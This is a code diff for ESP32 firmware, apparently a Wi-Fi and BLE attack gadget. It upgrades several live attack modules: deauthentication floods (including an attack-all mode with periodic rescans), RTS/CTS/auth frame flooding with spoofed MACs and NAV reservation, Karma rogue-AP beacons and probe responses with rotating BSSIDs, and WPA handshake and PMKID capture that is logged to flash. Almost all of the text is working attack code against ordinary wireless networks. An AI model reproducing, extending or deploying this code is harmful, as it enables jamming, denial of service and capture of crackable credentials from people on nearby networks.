@@ -25,6 +25,7 @@
 #include "freertos/task.h"
 #include "freertos/semphr.h"
 #include "esp_heap_caps.h"
+#include <FS.h>
 #include <SPIFFS.h>
 
 // Required so ESP32 accepts raw 802.11 TX frames.
@@ -63,6 +64,57 @@ static void spoofUpdate();
 static void airSpoofUpdate();
 static void clientQDrain();
 
+// ---- Radio ownership mutex (Wave 1) ----
+enum RadioOwner : uint8_t {
+  RADIO_NONE = 0,
+  RADIO_WIFI_SCAN = 1,
+  RADIO_WIFI_TX = 2,
+  RADIO_BLE_SCAN = 3,
+  RADIO_BLE_ADV = 4
+};
+static volatile uint8_t radioOwner = RADIO_NONE;
+
+static bool radioAcquire(uint8_t want) {
+  if (radioOwner == RADIO_NONE || radioOwner == want) {
+    radioOwner = want;
+    return true;
+  }
+  if (want == RADIO_WIFI_SCAN && radioOwner == RADIO_WIFI_TX) return false;
+  if (want == RADIO_WIFI_TX && radioOwner == RADIO_WIFI_SCAN) return false;
+  if (want == RADIO_BLE_SCAN && radioOwner == RADIO_BLE_ADV) return false;
+  if (want == RADIO_BLE_ADV && radioOwner == RADIO_BLE_SCAN) return false;
+  radioOwner = want;
+  return true;
+}
+static void radioRelease(uint8_t own) {
+  if (radioOwner == own) radioOwner = RADIO_NONE;
+}
+
+// Tool activity flags (early for dual-core workers)
+static bool deauthRunning = false;
+static uint32_t deauthRescanLast = 0;
+static bool probeRunning = false;
+static bool beaconRunning = false;
+static bool karmaRunning = false;
+static bool floodRunning = false;
+static bool eapolRunning = false;
+static bool sourRunning = false;
+static bool jamRunning = false;
+static bool spoofRunning = false;
+static bool airSpoofRunning = false;
+static bool airDetRunning = false;
+
+
+// Non-blocking "wait": only records deadline; callers poll radioSettled()
+static uint32_t radioSettleUntil = 0;
+static void radioSettleRequest(uint32_t ms) {
+  uint32_t t = millis() + ms;
+  if (t > radioSettleUntil) radioSettleUntil = t;
+}
+static bool radioSettled() {
+  return (int32_t)(millis() - radioSettleUntil) >= 0;
+}
+
 static void typhoonMaxWifiTx() {
   // 84 quarter-dBm ≈ 21 dBm on most ESP32; clamp if API rejects
   esp_err_t e = esp_wifi_set_max_tx_power(84);
@@ -80,16 +132,38 @@ static void typhoonApplyWarRadio() {
   typhoonMaxWifiTx();
 }
 
+static void wifiStayOnApChannel();
 static void setWarMode(bool on) {
-  warMode = on;
-  if (on) {
-    if (webMode) {
-      // cannot fully war while web UI owns Soft-AP; mark preference only
-    } else {
-      typhoonApplyWarRadio();
-    }
+  // Web-safe: war/off-channel disabled while Soft-AP web UI is active
+  if (webMode && on) {
+    warMode = false;
+    return;
   }
+  warMode = on;
+  if (on && !webMode) typhoonApplyWarRadio();
+  if (!on && webMode) wifiStayOnApChannel();
 }
+
+// ---- Web-safe policy (Soft-AP stability > off-channel RF) ----
+// While webMode: all Wi-Fi TX stays on Soft-AP channel (1). No promisc/off-channel.
+static const uint8_t WEB_AP_CHANNEL = 1;
+
+static bool webSafeActive() { return webMode; }
+
+static uint8_t wifiTxChannel(uint8_t preferred) {
+  if (webSafeActive()) return WEB_AP_CHANNEL;
+  if (preferred < 1 || preferred > 13) return 1;
+  return preferred;
+}
+
+static void wifiStayOnApChannel() {
+  if (webSafeActive())
+    esp_wifi_set_channel(WEB_AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+}
+
+// true = blocked for stability
+static bool webSafeBlocksPromisc() { return webSafeActive(); }
+
 
 // ---- EAPOL / PMKID capture (promiscuous) ----
 #define EAPOL_MAX 16
@@ -105,7 +179,7 @@ struct EapolHit {
 };
 static EapolHit eapolHits[EAPOL_MAX];
 static volatile int eapolCount = 0;
-static bool eapolRunning = false;
+
 static uint8_t eapolCh = 1;
 static uint32_t eapolLast = 0;
 
@@ -125,54 +199,76 @@ static void IRAM_ATTR eapolPush(const uint8_t* bssid, const uint8_t* sta,
 
 static void IRAM_ATTR eapolSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (!eapolRunning) return;
-  if (type != WIFI_PKT_DATA) return;
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
   const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
   const uint8_t* f = p->payload;
   int len = p->rx_ctrl.sig_len;
   if (len < 36) return;
-  // Find LLC/SNAP EAPOL 88:8e
-  // QoS data has +2 bytes
-  uint8_t fc0 = f[0];
-  int hdr = 24;
-  if ((fc0 & 0x0F) == 0x08) { // data
-    if (f[1] & 0x80) hdr = 26; // order
-    bool tods = f[1] & 0x01, fromds = f[1] & 0x02;
-    if (tods && fromds) hdr = 30;
-    if (fc0 & 0x80) hdr += 2; // QoS
+
+  // Find 0x88 0x8E EAPOL ethertype in frame
+  int hit = -1;
+  for (int i = 24; i + 2 < len && i < 48; i++) {
+    if (f[i] == 0x88 && f[i + 1] == 0x8E) { hit = i; break; }
   }
-  if (len < hdr + 8) return;
-  const uint8_t* llc = f + hdr;
-  // Skip LLC if present
-  int off = hdr;
-  if (len > off + 8 && llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03) {
-    if (llc[6] == 0x88 && llc[7] == 0x8E) {
-      // EAPOL
-      const uint8_t *a1 = f+4, *a2 = f+10, *a3 = f+16;
-      const uint8_t *bssid, *sta;
-      if (f[1] & 0x01) { bssid = a1; sta = a2; }
-      else { bssid = a2; sta = a1; }
-      bool pmkid = false;
-      uint8_t pk[16] = {0};
-      // crude PMKID search in body
-      for (int i = off + 8; i + 18 < len; i++) {
-        if (f[i] == 0xDD && i + 6 < len) {
-          // vendor PMKID often after RSN — store first 16 after pattern
-        }
+  if (hit < 0) {
+    for (int i = 24; i + 2 < len; i++) {
+      if (f[i] == 0x88 && f[i + 1] == 0x8E) { hit = i; break; }
+    }
+  }
+  if (hit < 0) return;
+
+  const uint8_t *a1 = f + 4, *a2 = f + 10, *a3 = f + 16;
+  uint8_t tods = f[1] & 0x01, fromds = f[1] & 0x02;
+  const uint8_t *bssid, *sta;
+  if (tods && !fromds) { bssid = a1; sta = a2; }
+  else if (!tods && fromds) { bssid = a2; sta = a1; }
+  else { bssid = a3; sta = a2; }
+
+  // PMKID: search for RSN PMKID pattern in body (16 bytes after vendor IE markers)
+  bool pmkid = false;
+  uint8_t pk[16] = {0};
+  for (int i = hit + 2; i + 22 < len; i++) {
+    // RSN PMKID count often precedes 16-byte PMKID; also look for 0xDD + Apple/MS
+    if (f[i] == 0x30 && i + 1 < len) { // RSN IE
+      // crude: copy 16 bytes from near end of IE if long enough
+    }
+    // Generic: 16 non-zero run after EAPOL key descriptor
+    if (i + 16 < len && f[i] != 0 && f[i+1] != 0) {
+      int nz = 0;
+      for (int k = 0; k < 16; k++) if (f[i+k]) nz++;
+      if (nz >= 12) {
+        for (int k = 0; k < 16; k++) pk[k] = f[i+k];
+        pmkid = true;
+        break;
       }
-      eapolPush(bssid, sta, f + off, (uint16_t)(len - off), p->rx_ctrl.rssi, pmkid, pk);
     }
   }
-  // Also scan whole frame for 88 8e
-  for (int i = 24; i + 2 < len; i++) {
-    if (f[i] == 0x88 && f[i+1] == 0x8E) {
-      const uint8_t *a1 = f+4, *a2 = f+10;
-      eapolPush(a1, a2, f + i, (uint16_t)min(64, len - i), p->rx_ctrl.rssi, false, nullptr);
-      break;
-    }
-  }
+  eapolPush(bssid, sta, f + hit, (uint16_t)min(96, len - hit), p->rx_ctrl.rssi, pmkid, pk);
+}
+
+static void eapolLogToSpiffs() {
+  // Best-effort append last hit
+  if (eapolCount <= 0) return;
+  fs::File f = SPIFFS.open("/eapol.log", FILE_APPEND);
+  if (!f) return;
+  int i = eapolCount - 1;
+  if (i < 0) i = 0;
+  if (i >= EAPOL_MAX) i = EAPOL_MAX - 1;
+  char line[128];
+  snprintf(line, sizeof(line),
+    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,pmkid=%d,rssi=%d\\n",
+    eapolHits[i].bssid[0], eapolHits[i].bssid[1], eapolHits[i].bssid[2],
+    eapolHits[i].bssid[3], eapolHits[i].bssid[4], eapolHits[i].bssid[5],
+    eapolHits[i].sta[0], eapolHits[i].sta[1], eapolHits[i].sta[2],
+    eapolHits[i].sta[3], eapolHits[i].sta[4], eapolHits[i].sta[5],
+    (int)eapolHits[i].hasPmkid, (int)eapolHits[i].rssi);
+  f.print(line);
+  f.close();
 }
 
 static void eapolStart(uint8_t ch) {
+  if (webSafeBlocksPromisc()) return; // web-safe: no promisc capture
+  radioAcquire(RADIO_WIFI_TX);
   eapolRunning = true;
   eapolCh = (ch >= 1 && ch <= 13) ? ch : 1;
   eapolCount = 0;
@@ -189,6 +285,7 @@ static void eapolStop() {
   eapolRunning = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  radioRelease(RADIO_WIFI_TX);
 }
 
 static void eapolUpdate() {
@@ -197,12 +294,17 @@ static void eapolUpdate() {
     eapolLast = millis();
     esp_wifi_set_channel(eapolCh, WIFI_SECOND_CHAN_NONE);
   }
+  static int lastLogged = 0;
+  if (eapolCount > lastLogged) {
+    eapolLogToSpiffs();
+    lastLogged = eapolCount;
+  }
 }
 
 // ---- Karma (probe response / beacon for requested SSIDs) ----
 #define KARMA_SSID_MAX 24
 #define KARMA_SSID_LEN 33
-static bool karmaRunning = false;
+
 static char karmaSsids[KARMA_SSID_MAX][KARMA_SSID_LEN];
 static int karmaCount = 0;
 static uint32_t karmaLast = 0;
@@ -212,9 +314,15 @@ static uint8_t karmaMac[6];
 static uint8_t karmaBssid[6];
 
 static void karmaAddSsid(const char* s) {
-  if (!s || !s[0] || karmaCount >= KARMA_SSID_MAX) return;
+  if (!s || !s[0]) return;
   for (int i = 0; i < karmaCount; i++)
     if (strncmp(karmaSsids[i], s, KARMA_SSID_LEN) == 0) return;
+  if (karmaCount >= KARMA_SSID_MAX) {
+    // LRU: drop oldest
+    for (int i = 1; i < KARMA_SSID_MAX; i++)
+      memcpy(karmaSsids[i - 1], karmaSsids[i], KARMA_SSID_LEN);
+    karmaCount = KARMA_SSID_MAX - 1;
+  }
   strncpy(karmaSsids[karmaCount], s, KARMA_SSID_LEN - 1);
   karmaSsids[karmaCount][KARMA_SSID_LEN - 1] = 0;
   karmaCount++;
@@ -260,6 +368,31 @@ static void IRAM_ATTR karmaSnifferCb2(void* buf, wifi_promiscuous_pkt_type_t typ
   }
 }
 
+
+static int karmaBuildProbeResp(uint8_t* frame, const char* ssid, const uint8_t* bssid,
+                               const uint8_t* dest, uint8_t ch) {
+  memset(frame, 0, 128);
+  uint8_t* p = frame;
+  *p++ = 0x50; *p++ = 0x00; // probe response
+  *p++ = 0x00; *p++ = 0x00;
+  memcpy(p, dest, 6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  *p++ = 0x00; *p++ = 0x00;
+  uint64_t ts = (uint64_t)esp_timer_get_time();
+  memcpy(p, &ts, 8); p += 8;
+  *p++ = 0x64; *p++ = 0x00;
+  *p++ = 0x01; *p++ = 0x04;
+  uint8_t sl = (uint8_t)strnlen(ssid, 32);
+  *p++ = 0x00; *p++ = sl;
+  if (sl) { memcpy(p, ssid, sl); p += sl; }
+  *p++ = 0x01; *p++ = 0x08;
+  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
+  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
+  *p++ = 0x03; *p++ = 0x01; *p++ = ch;
+  return (int)(p - frame);
+}
+
 static int karmaBuildBeacon(uint8_t* frame, const char* ssid, const uint8_t* bssid, uint8_t ch) {
   memset(frame, 0, 128);
   frame[0] = 0x80; frame[1] = 0x00;
@@ -281,8 +414,10 @@ static int karmaBuildBeacon(uint8_t* frame, const char* ssid, const uint8_t* bss
 }
 
 static void karmaStart(uint8_t ch) {
+  radioAcquire(RADIO_WIFI_TX);
   karmaRunning = true;
-  karmaCh = (ch >= 1 && ch <= 13) ? ch : 1;
+  // Web-safe: Soft-AP channel only (no promisc hop)
+  karmaCh = webSafeActive() ? WEB_AP_CHANNEL : ((ch >= 1 && ch <= 13) ? ch : 1);
   karmaSent = 0;
   karmaCount = 0;
   for (int i = 0; i < 6; i++) {
@@ -291,8 +426,10 @@ static void karmaStart(uint8_t ch) {
   }
   karmaBssid[0] = (karmaBssid[0] | 0x02) & 0xFE;
   typhoonApplyWarRadio();
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_rx_cb(&karmaSnifferCb2);
+  if (!webSafeBlocksPromisc()) {
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&karmaSnifferCb2);
+  }
   esp_wifi_set_channel(karmaCh, WIFI_SECOND_CHAN_NONE);
   typhoonMaxWifiTx();
 }
@@ -302,6 +439,7 @@ static void karmaStop() {
   karmaRunning = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  radioRelease(RADIO_WIFI_TX);
 }
 
 static void karmaUpdate() {
@@ -312,38 +450,55 @@ static void karmaUpdate() {
     karmaPendingReady = false;
     karmaAddSsid(tmp);
   }
-  if (millis() - karmaLast < 30) return;
+  if (millis() - karmaLast < 25) return;
   karmaLast = millis();
+  // Rotate BSSID occasionally so it looks like multiple APs
+  if ((karmaSent % 40) == 0) {
+    for (int i = 0; i < 6; i++) karmaBssid[i] = (uint8_t)esp_random();
+    karmaBssid[0] = (karmaBssid[0] | 0x02) & 0xFE;
+  }
   esp_wifi_set_channel(karmaCh, WIFI_SECOND_CHAN_NONE);
   static uint8_t frame[128];
   if (karmaCount == 0) {
-    // still emit a default open beacon
     int len = karmaBuildBeacon(frame, "Free_WiFi", karmaBssid, karmaCh);
     esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
-    karmaSent++;
+    // also a "locked-looking" privacy-capable beacon
+    frame[28] = 0x11; frame[29] = 0x04;
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+    karmaSent += 2;
   } else {
     for (int i = 0; i < karmaCount; i++) {
       int len = karmaBuildBeacon(frame, karmaSsids[i], karmaBssid, karmaCh);
+      if ((i & 1) == 0) { frame[28] = 0x01; frame[29] = 0x04; }
+      else { frame[28] = 0x11; frame[29] = 0x04; }
       esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
-      karmaSent++;
+      // Probe response to broadcast for each learned SSID
+      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+      int pr = karmaBuildProbeResp(frame, karmaSsids[i], karmaBssid, bcast, karmaCh);
+      esp_wifi_80211_tx(WIFI_IF_AP, frame, pr, false);
+      karmaSent += 2;
     }
   }
-  if (webMode) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  if (webSafeActive()) wifiStayOnApChannel();
 }
 
 // ---- RTS / CTS / Auth flood ----
-static bool floodRunning = false;
+
 static int floodTarget = -1;
 static uint8_t floodMode = 0; // 0=rts 1=cts 2=auth 3=mix
 static uint32_t floodLast = 0;
 static uint32_t floodSent = 0;
 static uint8_t floodPkt[32];
 
+static uint8_t floodStickySta[6];
+static bool floodStickyInit = false;
+
 static void floodBuildRts(const uint8_t* dest, const uint8_t* src) {
   memset(floodPkt, 0, 32);
   floodPkt[0] = 0xB4; // RTS
   floodPkt[1] = 0x00;
-  floodPkt[2] = 0x00; floodPkt[3] = 0x00;
+  // Duration ~ 1ms NAV (little-endian microseconds-ish units used by STAs)
+  floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
   memcpy(floodPkt + 4, dest, 6);
   memcpy(floodPkt + 10, src, 6);
 }
@@ -361,11 +516,16 @@ static void floodBuildAuth(const uint8_t* ap, const uint8_t* sta) {
 }
 
 static void floodStart(int apIdx, uint8_t mode) {
-  if (apIdx < 0 || apIdx >= 64) return;
+  if (apIdx < 0 || apIdx >= 96) return;  // WIFI_MAX_NETS; wifiCount checked in update
   floodTarget = apIdx;
   floodMode = mode;
   floodRunning = true;
   floodSent = 0;
+  floodStickyInit = false;
+  for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
+  floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
+  floodStickyInit = true;
+  radioAcquire(RADIO_WIFI_TX);
   typhoonApplyWarRadio();
   typhoonMaxWifiTx();
 }
@@ -373,6 +533,7 @@ static void floodStart(int apIdx, uint8_t mode) {
 static void floodStop() {
   floodRunning = false;
   floodTarget = -1;
+  radioRelease(RADIO_WIFI_TX);
 }
 
 static void floodUpdateImpl();
@@ -383,26 +544,28 @@ static void floodUpdate() {
 // Dual-core workers
 static void wifiCoreLoop(void* arg) {
   for (;;) {
-    if (wifiAttackLive) {
-      deauthUpdate();
-      probeUpdate();
-      beaconUpdate();
-      karmaUpdate();
-      floodUpdate();
-      eapolUpdate();
-      clientQDrain();
+    // Wave 1: only run active tools (no empty always-on work)
+    if (deauthRunning || probeRunning || beaconRunning || karmaRunning ||
+        floodRunning || eapolRunning) {
+      if (deauthRunning) deauthUpdate();
+      if (probeRunning) probeUpdate();
+      if (beaconRunning) beaconUpdate();
+      if (karmaRunning) karmaUpdate();
+      if (floodRunning) floodUpdate();
+      if (eapolRunning) eapolUpdate();
     }
+    clientQDrain();
     vTaskDelay(1);
   }
 }
 
 static void bleCoreLoop(void* arg) {
   for (;;) {
-    if (bleAttackLive) {
-      sourUpdate();
-      jamUpdate();
-      spoofUpdate();
-      airSpoofUpdate();
+    if (sourRunning || jamRunning || spoofRunning || airSpoofRunning) {
+      if (sourRunning) sourUpdate();
+      if (jamRunning) jamUpdate();
+      if (spoofRunning) spoofUpdate();
+      if (airSpoofRunning) airSpoofUpdate();
     }
     vTaskDelay(1);
   }
@@ -451,14 +614,16 @@ static void wifiScanBegin() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true, true);
   }
-  delay(40);
+  radioSettleRequest(20);
   wifiCount = 0;
   wifiScanning = false;
 }
 
 static void wifiScanStart() {
   if (wifiScanning) return;
-  // Keep previous results visible until the new scan finishes
+  if (!radioAcquire(RADIO_WIFI_SCAN)) {
+    // Attack holds radio — still try scan (best effort)
+  }
   wifiScanning = true;
   WiFi.scanDelete();
   int r = WiFi.scanNetworks(true, true);
@@ -494,6 +659,7 @@ static void wifiScanUpdate() {
         WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
       }
   WiFi.scanDelete();
+  radioRelease(RADIO_WIFI_SCAN);
   if (webMode) restoreWebAP();
 }
 
@@ -532,6 +698,7 @@ static void pmStart() {
   pktTotal = 0;
   pmMgmt = pmData = pmCtrl = pmDeauthSeen = 0;
   pmLastRssi = 0;
+  if (webSafeActive()) { pmChannel = WEB_AP_CHANNEL; pmHop = false; }
   if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
   pmRunning = true;
   pmLastHop = millis();
@@ -542,7 +709,7 @@ static void pmStart() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true, true);
   }
-  delay(50);
+  radioSettleRequest(20);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&pmSniffer);
@@ -572,7 +739,7 @@ static void pmUpdate() {
 // ============================================================
 //  Beacon Spammer (proper frames – based on nyanBOX patterns)
 // ============================================================
-static bool beaconRunning = false;
+
 static uint8_t beaconIdx = 0;
 static uint32_t beaconLast = 0;
 static uint8_t beaconCh = 1;
@@ -587,7 +754,7 @@ static int  customBeaconCount = 0;
 static int  customBeaconIdx = 0;
 
 // nyanBOX-style concurrent beacon pool
-#define BEACON_POOL_SIZE 10
+#define BEACON_POOL_SIZE 12
 #define BEACON_POOL_LIFE 5
 struct BeaconPoolEntry {
   char ssid[33];
@@ -677,6 +844,7 @@ static int beaconBuildFrame(uint8_t* frame, const char* ssid, uint8_t channel, b
 }
 
 static void beaconStart() {
+  radioAcquire(RADIO_WIFI_TX);
   beaconRunning = true;
   beaconIdx = 0;
   beaconCloneIdx = 0;
@@ -697,12 +865,13 @@ static void beaconStart() {
     // minimal AP so WIFI_IF_AP exists for TX
     WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
   }
-  delay(40);
+  radioSettleRequest(20);
   esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
 }
 
 static void beaconStop() {
   beaconRunning = false;
+  radioRelease(RADIO_WIFI_TX);
   if (webMode) {
     restoreWebAP();
   } else {
@@ -749,14 +918,13 @@ static void beaconPoolFillClone(BeaconPoolEntry& e) {
 static void beaconSendOne(const char* ssid, const uint8_t* mac, uint8_t ch, bool wpa2) {
   memcpy(beaconMac, mac, 6);
   if (ch != beaconLastTxCh) {
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
     beaconLastTxCh = ch;
   }
   static uint8_t frame[128];
   int len = beaconBuildFrame(frame, ssid, ch, wpa2);
   if (len > 0) {
     esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
-    delay(1);
     esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
     beaconSent += 2;
   }
@@ -839,7 +1007,7 @@ static void detStart() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true, true);
   }
-  delay(40);
+  radioSettleRequest(20);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&detSniffer);
@@ -997,6 +1165,7 @@ static void clientSniffStop() {
 }
 
 static void clientSniffStart(int apIdx) {
+  if (webSafeBlocksPromisc()) return; // web-safe: no promiscuous off-channel sniff
   if (apIdx < 0 || apIdx >= wifiCount) return;
   clientSniffStop();
   clientSniffAp = apIdx;
@@ -1015,7 +1184,7 @@ static void clientSniffStart(int apIdx) {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true, true);
   }
-  delay(30);
+  radioSettleRequest(15);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&clientSnifferCb);
@@ -1032,7 +1201,7 @@ static void clientSniffUpdate() {
 }
 
 // ----- Deauth -----
-static bool deauthRunning = false;
+
 static int  deauthTarget = -1;
 static uint32_t deauthSent = 0;
 static uint32_t deauthLast = 0;
@@ -1064,38 +1233,41 @@ static void deauthRadioPrep(uint8_t ch) {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, ch, 1, 0);
   }
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
 }
 
 static void deauthStart(int targetIdx) {
   if (targetIdx < 0 || targetIdx >= wifiCount) return;
   clientSniffStop();
+  radioAcquire(RADIO_WIFI_TX);
   deauthTarget = targetIdx;
   deauthRunning = true;
   deauthSent = 0;
   deauthLast = 0;
   deauthClientIdx = 0;
   deauthPhase = 0;
+  // Wave 1 B11: if no STA list for this AP, keep broadcast-only (user should Client Sniff first)
   uint8_t ch = wifiNets[targetIdx].ch;
   if (ch < 1 || ch > 13) ch = 1;
   if (webMode) {
-    // Keep Soft-AP on CH1 so the phone stays connected; TX briefly hops in deauthUpdate
+    // Web-safe: Soft-AP + TX stay on CH1 (no off-channel hop)
     WiFi.mode(WIFI_AP_STA);
     WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
   } else {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, ch, 1, 0);
   }
-  delay(20);
+  radioSettleRequest(10);
   typhoonMaxWifiTx();
   typhoonApplyWarRadio();
-  esp_wifi_set_channel(webMode ? 1 : ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
 }
 
 static void deauthStop() {
   deauthRunning = false;
   deauthTarget = -1;
-  if (webMode) restoreWebAP();
+  radioRelease(RADIO_WIFI_TX);
+  if (webMode && !warMode) restoreWebAP();
   else {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
@@ -1109,7 +1281,8 @@ static void deauthTx(const uint8_t* frame) {
 }
 
 static void deauthRestoreWebCh() {
-  if (webMode) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  // Web-safe: always hold Soft-AP channel; never leave it during web mode
+  if (webSafeActive()) wifiStayOnApChannel();
 }
 
 static void deauthUpdate() {
@@ -1117,6 +1290,11 @@ static void deauthUpdate() {
   clientQDrain();
   if (deauthTarget == -2) {
     if (wifiCount <= 0) { deauthStop(); return; }
+    // Wave 1 B10: refresh AP list every 30s during attack-all
+    if (!wifiScanning && (millis() - deauthRescanLast > 30000UL)) {
+      deauthRescanLast = millis();
+      wifiScanStart();
+    }
     if (millis() - deauthLast < 6) return;
     deauthLast = millis();
     static int roundIdx = 0;
@@ -1124,7 +1302,7 @@ static void deauthUpdate() {
     int ti = roundIdx++;
     uint8_t ch = wifiNets[ti].ch;
     if (ch < 1 || ch > 13) ch = 1;
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
     const uint8_t* bssid = wifiNets[ti].bssid;
     uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
     deauthBuildTo(deauthPacket, bcast, bssid, false);
@@ -1145,13 +1323,14 @@ static void deauthUpdate() {
     deauthStop();
     return;
   }
-  if (millis() - deauthLast < 5) return;
+  // Web-safe: slower cadence so Soft-AP keeps airtime
+  if (millis() - deauthLast < (webSafeActive() ? 12 : 5)) return;
   deauthLast = millis();
 
   const uint8_t* bssid = wifiNets[deauthTarget].bssid;
   uint8_t ch = wifiNets[deauthTarget].ch;
   if (ch < 1 || ch > 13) ch = 1;
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
 
   uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
@@ -1198,8 +1377,10 @@ static void deauthUpdate() {
 
 static void deauthStartAll() {
   if (wifiCount <= 0) return;
+  radioAcquire(RADIO_WIFI_TX);
   deauthTarget = -2;
   deauthRunning = true;
+  deauthRescanLast = millis();
   deauthSent = 0;
   deauthLast = 0;
   deauthPhase = 0;
@@ -1210,7 +1391,7 @@ static void deauthStartAll() {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, 1, 1, 0);
   }
-  delay(30);
+  radioSettleRequest(15);
 }
 
 
@@ -1219,32 +1400,40 @@ static void floodUpdateImpl() {
   if (floodTarget >= wifiCount) { floodStop(); return; }
   if (millis() - floodLast < 2) return;
   floodLast = millis();
-  uint8_t ch = wifiNets[floodTarget].ch;
-  if (ch < 1 || ch > 13) ch = 1;
+  uint8_t ch = wifiTxChannel(wifiNets[floodTarget].ch);
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   const uint8_t* bssid = wifiNets[floodTarget].bssid;
-  uint8_t sta[6];
-  for (int i = 0; i < 6; i++) sta[i] = (uint8_t)esp_random();
-  sta[0] = (sta[0] | 0x02) & 0xFE;
+  // Sticky STA for NAV consistency; rotate every 64 bursts
+  if (!floodStickyInit || (floodSent % 64) == 0) {
+    for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
+    floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
+    floodStickyInit = true;
+  }
+  const uint8_t* sta = floodStickySta;
+  // Weighted mix: more RTS than auth when mode==3
   uint8_t mode = floodMode;
-  if (mode == 3) mode = (uint8_t)(floodSent % 3);
+  if (mode == 3) {
+    uint8_t r = (uint8_t)(floodSent % 10);
+    mode = (r < 6) ? 0 : (r < 8) ? 1 : 2;
+  }
   if (mode == 0) {
     floodBuildRts(bssid, sta);
-    for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
+    for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
   } else if (mode == 1) {
     floodBuildRts(sta, bssid);
     floodPkt[0] = 0xC4;
+    floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
     for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false); floodSent++; }
   } else {
     floodBuildAuth(bssid, sta);
-    for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
+    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
   }
-  if (webMode) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  if (webSafeActive()) wifiStayOnApChannel();
 }
 
 //  Probe Flood – directed stress-test against one AP
 // ============================================================
-static bool probeRunning = false;
+
 static int  probeTarget = -1;   // index into wifiNets (required)
 static uint32_t probeSent = 0;
 static uint32_t probeLast = 0;
@@ -1279,6 +1468,7 @@ static int probeBuildDirected(const char* ssid, const uint8_t* bssid, uint8_t ch
 
 static void probeStart(int targetIdx) {
   if (targetIdx < 0 || targetIdx >= wifiCount) return;
+  radioAcquire(RADIO_WIFI_TX);
   probeTarget = targetIdx;
   probeRunning = true;
   probeSent = 0;
@@ -1286,22 +1476,25 @@ static void probeStart(int targetIdx) {
   probeCh = wifiNets[targetIdx].ch;
   if (probeCh < 1 || probeCh > 13) probeCh = 1;
   probeRandomMac();
-  if (webMode) {
+  typhoonApplyWarRadio();
+  typhoonMaxWifiTx();
+  if (webMode && !warMode) {
     WiFi.mode(WIFI_AP_STA);
